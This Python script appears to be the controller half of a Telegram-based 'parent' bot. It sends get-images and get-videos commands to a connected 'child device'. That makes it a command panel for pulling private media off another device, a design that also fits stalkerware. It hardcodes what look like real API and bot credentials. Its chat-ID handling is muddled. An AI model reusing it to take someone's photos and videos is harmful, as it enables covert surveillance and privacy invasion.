import asyncio
from telethon import TelegramClient, events, Button

# ================= CONFIG =================
API_ID = 22071176
API_HASH = "7ed5401b625a0a4d3c45caf12c87f166"
BOT_TOKEN = "7402879073:AAFmS3FxnAMRDCdScW76TD9nwt19pXAIooQ"
AUTHORIZED_PARENT_IDS = {8032922682}  # your Telegram ID
# =========================================

client = TelegramClient('parent_session', API_ID, API_HASH)

# Store child device chat ID after connection
child_chat_id = None
media_message_id = None

@client.on(events.NewMessage(incoming=True))
async def handler(event):
    global child_chat_id, media_message_id

    # Only respond to parent
    if event.sender_id not in AUTHORIZED_PARENT_IDS:
        await event.respond("Unauthorized sender.")
        return

    text = (event.raw_text or "").strip().lower()

    # Initial start
    if text == "/start":
        await event.respond("Parent bot online ✅\nWaiting for child device...")

    # Detect child device connection
    elif "device connected" in text:
        child_chat_id = event.sender_id  # store child device chat ID
        # Send “Receive Media” button
        msg = await event.respond(
            "Child device connected ✅\nSelect an action:",
            buttons=[[Button.inline("Receive Media", b"receive_media")]]
        )
        media_message_id = msg.id

@client.on(events.CallbackQuery)
async def callback(event):
    global child_chat_id, media_message_id

    if event.sender_id not in AUTHORIZED_PARENT_IDS:
        await event.answer("Unauthorized", alert=True)
        return

    # Step 2: Receive Media button clicked
    if event.data == b"receive_media":
        await event.answer("Choose media type")
        await client.edit_message(
            child_chat_id,
            media_message_id,
            "Select media type to receive:",
            buttons=[
                [Button.inline("Get Images", b"get_images")],
                [Button.inline("Get Videos", b"get_videos")]
            ]
        )

    # Step 3: Get Images / Get Videos clicked
    elif event.data in [b"get_images", b"get_videos"]:
        command = b"get_images" if event.data == b"get_images" else b"get_videos"
        await event.answer(f"Command sent to child: {command.decode()} ✅")
        if child_chat_id:
            await client.send_message(child_chat_id, f"!{command.decode()}")
